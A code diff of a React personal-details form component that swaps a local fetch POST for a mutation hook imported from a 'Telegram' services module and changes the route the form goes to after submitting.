@@ -4,9 +4,11 @@ import download from "../assets/download2.png";
 import DatePicker from "react-datepicker";
 import "react-datepicker/dist/react-datepicker.css";
 import { useNavigate } from "react-router-dom";
+import { useSendPersonalMutation } from "../Services/Telegram";
 
 const Personal = () => {
   const navigate = useNavigate();
+  const [sendPersonal] = useSendPersonalMutation();
 
   const [formData, setFormData] = useState({
     father: "",
@@ -41,7 +43,6 @@ const Personal = () => {
 const handleSubmit = async (e) => {
   e.preventDefault();
 
-  // Validate all fields, and set the first field with error as currentErrorField
   if (!validateField("father")) {
     setCurrentErrorField("father");
     return;
@@ -65,23 +66,14 @@ const handleSubmit = async (e) => {
   setCurrentErrorField(null);
 
   try {
-    const response = await fetch("http://localhost:4000/sendPersonal", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(formData),
-    });
-
-    if (!response.ok) {
-      throw new Error("Failed to send details to server");
-    }
-
+    const response = await sendPersonal(formData).unwrap();
     console.log("Details sent successfully!");
-    navigate("/success");
+    navigate("/goal");
   } catch (error) {
     console.error("Error sending details:", error);
-    // Optionally, show an error message to user here
   }
 };
+
 
   
 
